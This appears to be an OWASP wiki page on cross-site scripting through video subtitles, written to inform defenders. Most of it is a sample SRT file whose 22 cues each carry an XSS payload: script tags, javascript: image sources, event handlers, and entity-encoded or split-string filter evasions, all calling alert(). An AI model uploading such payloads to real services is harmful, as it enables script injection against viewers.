---

layout: col-sidebar
title: Xss in subtitle
author: 
contributors: 
permalink: /attacks/Xss_in_subtitle
tags: attack, Xss in subtitle
auto-migrated: 1

---

## Description

It is possible for an attacker to execute JavaScript in a video's
subtitle. This is also referred to as XSS (Cross-Site Scripting).if a
website load subtitle separately in browser then a attacker can run any
html or javascript in video subtitle. It has been tested on some video
services.

## Examples

the attacker can save the mentioned contents below by the format of srt
and upload prepared srt file as a video's subtitles

﻿

1
﻿ 00:00:37,618 --\> 00:00:42,557
﻿ \<font color="\#ffff00"\>: '';\!--"\<XSS\>=&{()}\</font\>

2
﻿ 00:00:58,425 --\> 00:01:00,704
﻿ <IMG SRC="javascript:alert('XSS');">

3
﻿ 00:01:00,705 --\> 00:01:01,873
﻿ <IMG SRC=javascript:alert('XSS')>

4
﻿ 00:01:02,225 --\> 00:01:04,519
﻿ <IMG SRC=javascript:alert('XSS')>

5
﻿ 00:01:04,520 --\> 00:01:05,547
﻿ <IMG SRC=javascript:alert('XSS')>

6
﻿ 00:01:05,864 --\> 00:01:08,117
﻿ <IMG SRC=javascript:alert('XSS')>

7
﻿ 00:01:08,224 --\> 00:01:09,223
﻿ \<IMG """\>

    <SCRIPT>

    alert("XSS")

    </SCRIPT>

"\>

8
﻿ 00:01:09,224 --\> 00:01:10,434
﻿ <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

9
﻿ 00:01:11,384 --\> 00:01:12,427
﻿ <IMG SRC=# onmouseover="alert('xxs')">

10
﻿ 00:01:15,504 --\> 00:01:17,506
﻿ <IMG SRC= onmouseover="alert('xxs')">

11
﻿ 00:01:19,743 --\> 00:01:20,786
﻿ <IMG onmouseover="alert('xxs')">

12
﻿ 00:01:24,183 --\> 00:01:25,351
﻿ <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

13
﻿ 00:01:40,663 --\> 00:01:41,705
﻿
<img src=xonerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

14
﻿ 00:01:42,703 --\> 00:01:45,742
﻿ \<IMG SRC=<javascript:alert>( 'XSS')\>

15
﻿ 00:01:45,743 --\> 00:01:46,285
﻿ \<IMG SRC=&\#0000106&\#0000097&\#0000118&\#0000097&\#0000115&\#0000099&\#0000114&\#0000105&\#0000112&\#0000116&\#0000058&\#0000097&
\#0000108&\#0000101&\#0000114&\#0000116&\#0000040&\#0000039&\#0000088&\#0000083&\#0000083&\#0000039&\#0000041\>

16
﻿ 00:01:48,503 --\> 00:01:49,545
﻿ <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

17
﻿ 00:01:49,582 --\> 00:01:51,709
﻿ <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

18
﻿ 00:01:54,822 --\> 00:01:58,200
﻿ <IMG SRC="jav   ascript:alert('XSS');">

19
﻿ 00:02:01,021 --\> 00:02:03,691
﻿ <IMG SRC="jav
  ascript:alert('XSS');">

20
﻿ 00:02:04,702 --\> 00:02:05,744
﻿ <IMG SRC="javascript:alert('XSS');">

21
﻿ 00:02:15,700 --\> 00:02:18,536
﻿ \<IMG SRC="<javascript:alert>('XSS')"

22
﻿ 00:02:18,740 --\> 00:02:22,619
﻿ \\";alert('XSS');//



# Authors and Primary Editors

Mohammad MortazaviZade - 2mzrp2@gmail.com

## Related [Attacks](Attacks "wikilink")

  - [XSS Attacks](XSS_Attacks "wikilink")
  - [:Category:Injection Attack](:Category:Injection_Attack "wikilink")
  - [Invoking untrusted mobile
    code](Invoking_untrusted_mobile_code "wikilink")
  - [Cross Site History Manipulation
    (XSHM)](Cross_Site_History_Manipulation_\(XSHM\) "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

  - [:Category:Input Validation
    Vulnerability](:Category:Input_Validation_Vulnerability "wikilink")
  - [Cross Site Scripting Flaw](Cross_Site_Scripting_Flaw "wikilink")
  - [Types of Cross-Site
    Scripting](Types_of_Cross-Site_Scripting "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

  - [:Category:Input Validation](:Category:Input_Validation "wikilink")
  - [HTML Entity Encoding](HTML_Entity_Encoding "wikilink")
  - [Output Validation](Output_Validation "wikilink")
  - [Canonicalization](Canonicalization "wikilink")

## Categories

[Category:Injection](https://owasp.org/www-community/Injection_Flaws)
[Category:Attack](Category:Attack "wikilink") [Category:Code
Snippet](Category:Code_Snippet "wikilink")
